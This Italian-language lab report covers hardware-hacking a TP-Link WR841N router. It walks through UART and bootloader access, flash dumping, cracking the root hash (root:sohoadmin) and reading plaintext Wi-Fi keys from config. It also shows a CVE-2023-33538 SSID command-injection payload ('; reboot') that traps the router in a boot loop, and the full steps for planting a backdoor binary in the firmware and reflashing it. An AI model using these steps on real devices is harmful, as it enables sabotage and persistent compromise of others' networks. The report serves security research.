# Report Analisi Vulnerabilità -- TP‑Link WR841N (300N)

> Fonte: pagina Notion fornita dall'utente.\
> Nota: la pagina fa riferimento a diversi file e immagini (es. "FOTO
> NUOVE", "output", ecc.).\
> Tali allegati **non erano presenti nel contesto ricevuto**, quindi in
> questo documento sono stati **catalogati come placeholder**.

------------------------------------------------------------------------

# Indice

1.  Identificazione hardware
2.  Accesso alla console seriale (UART)
3.  Accesso al bootloader (U‑Boot)
4.  Esplorazione shell root
5.  Analisi contenuti flash
6.  Vulnerabilità verificata
7.  Backdoor custom (simulazione supply‑chain)
8.  Allegati e file referenziati

------------------------------------------------------------------------

# 1. Identificazione hardware

**Modello:** TP‑Link WR841N (300N)\
**Chipset:** Qualcomm Atheros QCA9533‑BL3A\
**RAM:** 32 MB\
**Flash:** 4 MB NOR

### Problema iniziale

La UART non funzionava perché la pista del pin RX era interrotta.

### Soluzione

Collegati i due punti con puntali **PCBite** → UART funzionante.

### File e immagini collegati

-   foto hardware router (placeholder)
-   foto UART (placeholder)
-   foto PCB (placeholder)

------------------------------------------------------------------------

# 2. Accesso alla console seriale (UART)

Bootlog catturato:

    Linux version 2.6.31 (tomcat@buildserver) (gcc version 4.3.3) #61 Tue Jun 16 14:17:33 CST 2015
    Ram size passed from bootloader =32M
    flash_size passed from bootloader = 4
    CPU revision is: 00019374 (MIPS 24Kc)
    Kernel command line: console=ttyS0,115200 root=31:2 rootfstype=squashfs init=/sbin/init mtdparts=ath-nor0:128k(u-boot),1024k(kernel),2816k(rootfs),64k(config),64k(art) mem=32M
    init started: BusyBox v1.01 (2015.06.16) multi-call binary

### Note tecniche

**root=31:2** - 31 = major number MTD block - 2 = partizione rootfs

**rootfstype=squashfs** - filesystem principale **read‑only**

### Partizioni flash

  Partizione   Dimensione   Descrizione
  ------------ ------------ -----------------------
  u‑boot       128k         bootloader
  kernel       1024k        kernel Linux
  rootfs       2816k        filesystem SquashFS
  config       64k          configurazione router
  art          64k          calibrazione WiFi

------------------------------------------------------------------------

# 3. Accesso al bootloader (U‑Boot)

Per interrompere il boot:

    premere "tpl" entro 1 secondo all'accensione

### Comandi disponibili

    boot
    bootm
    cp
    erase
    md
    mm
    mw
    nm
    ping
    printenv
    reset
    run
    setenv
    tftpboot
    version

### Variabili bootloader

    bootargs=console=ttyS0,115200 root=31:02 rootfstype=jffs2 init=/sbin/init
    mtdparts=ath-nor0:32k(u-boot1),32k(u-boot2),3008k(rootfs),896k(uImage),64k(mib0),64k(ART)

### Incoerenza rilevata

U‑Boot dichiara:

    rootfstype=jffs2

ma il boot reale usa:

    rootfstype=squashfs

Questo suggerisce che:

-   il kernel usa parametri **hardcoded**
-   le variabili U‑Boot **non vengono utilizzate**

------------------------------------------------------------------------

# 4. Esplorazione shell root

Credenziali ottenute:

    root : sohoadmin

### Comandi disponibili

#### /bin

    busybox chmod df false ip kill login mount ping rm sleep umount
    cat date echo hostname iptables-xml ln ls msh ps sh true

#### /sbin

    80211stats brctl init iptables-restore iwpriv pktlogconf route vconfig
    apstats getty insmod iptables-save klogd pktlogdump syslogd wifitool
    athstats hostapd iptables iwconfig logread reboot tc wlanconfig
    athstatsclr ifconfig iptables-multi iwlist lsmod rmmod udhcpc wpa_supplicant

#### /usr/bin

    arping
    backdoorTest
    dbclient
    dropbear
    dropbearconvert
    dropbearkey
    httpd
    lld2d
    logger
    scp
    tftp

------------------------------------------------------------------------

### Partizioni MTD

    cat /proc/mtd

Output:

    mtd0: u-boot
    mtd1: kernel
    mtd2: rootfs
    mtd3: config
    mtd4: art

------------------------------------------------------------------------

### Mount filesystem

    /dev/mtdblock2 on / type squashfs (ro)
    /proc on /proc
    /tmp ramfs
    /var ramfs

------------------------------------------------------------------------

### Dump partizioni via TFTP

    tftp -p -l /dev/mtdblock2 -r rootfs 192.168.0.100

Oppure tramite **programmer CH341A**.

------------------------------------------------------------------------

# 5. Analisi contenuti flash

## RootFS

Directory principali:

    /bin/busybox
    /etc/passwd
    /etc/shadow
    /etc/inittab
    /usr/bin/dropbear
    /usr/bin/httpd
    /usr/bin/backdoorTest

### /etc/inittab

    ::sysinit:/etc/rc.d/rcS
    ::respawn:/sbin/getty ttyS0 115200
    ::shutdown:/bin/umount -a

### Boot flow

1.  Kernel
2.  /sbin/init (BusyBox)
3.  /etc/rc.d/rcS
4.  avvio servizi router

------------------------------------------------------------------------

### Hash password root

    root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/

Algoritmo:

    MD5-Crypt

Verifica con hashcat:

    hashcat -m 500 -a 0 hash.txt wordlist.txt

Risultato:

    sohoadmin

------------------------------------------------------------------------

## Partizione config

Contiene:

-   username admin
-   password pannello web
-   chiave WPA

### Dump con strings

    admin21232f297a57a5a743894a0e4a801fc3
    97928270

MD5:

    21232f297a57a5a743894a0e4a801fc3 = admin

Dopo cambio password:

    admin568ef81550071b3dc7a13beea465516f
    testwifipw

### Nota sicurezza

Nei router consumer:

-   WPA key spesso salvata **in chiaro**
-   nessun TPM o secure storage

Il modello di minaccia **non considera accesso fisico alla flash**.

------------------------------------------------------------------------

# 6. Vulnerabilità verificata

**CVE‑2023‑33538 -- SSID Injection**

Analisi con **Ghidra** del binario `httpd`.

Call vulnerabile:

    execFormatCmd("iwconfig %s essid %s", ifname, user_ssid);

Problema:

-   nessuna sanitizzazione di `user_ssid`

------------------------------------------------------------------------

### Exploit

Inserire SSID:

    ; reboot

Risultato:

-   router entra in **boot loop**

Motivo:

-   SSID salvato in flash
-   riletto ad ogni boot

------------------------------------------------------------------------

### Recovery

Il reset hardware non funziona.

Soluzione:

1.  dump firmware
2.  modificare SSID
3.  riflashare con **CH341A**

------------------------------------------------------------------------

# 7. Backdoor custom (simulazione supply‑chain)

## Identificazione architettura

    file busybox

Output:

    ELF 32-bit MSB executable, MIPS, MIPS32r2, uClibc

------------------------------------------------------------------------

## Compilazione backdoor

    mips-linux-gcc -static backdoorTest.c -o backdoorTest

Binario statico per evitare dipendenze.

------------------------------------------------------------------------

## Estrazione rootfs

    dd if=firmware.bin of=squashfs.img skip=1179648 count=2794097 bs=1

    unsquashfs squashfs.img

------------------------------------------------------------------------

## Modifica rootfs

Copia backdoor:

    /usr/bin/backdoorTest

Modifica script di boot:

    /etc/rc.d/rcS

aggiungendo:

    /usr/bin/backdoorTest &

------------------------------------------------------------------------

## Ricostruzione firmware

    mksquashfs squashfs-root/ newsquashfs.img -comp lzma -no-xattrs -noappend

    binwalk newsquashfs.img

    dd if=newsquashfs.img of=firmware.bin bs=1 seek=1179648 conv=notrunc

Flash:

    flashrom -p ch341a_spi -w firmware.bin

------------------------------------------------------------------------

# 8. Allegati referenziati nella pagina

## Immagini

Placeholder identificati:

-   FOTO NUOVE
-   FOTO NUOVE PT2
-   FOTO NUOVE PT3 FATTE CON IPHONE

Tipologia probabile:

-   foto PCB router
-   foto collegamento UART
-   foto laboratorio

------------------------------------------------------------------------

## Output tecnici

-   bootlog UART
-   dump partizioni MTD
-   output hashcat
-   output file busybox

------------------------------------------------------------------------

## File binari e firmware

-   firmware.bin
-   squashfs.img
-   newsquashfs.img

------------------------------------------------------------------------

## Tool utilizzati

-   Ghidra
-   hashcat
-   binwalk
-   flashrom
-   buildroot
-   unsquashfs
-   mksquashfs
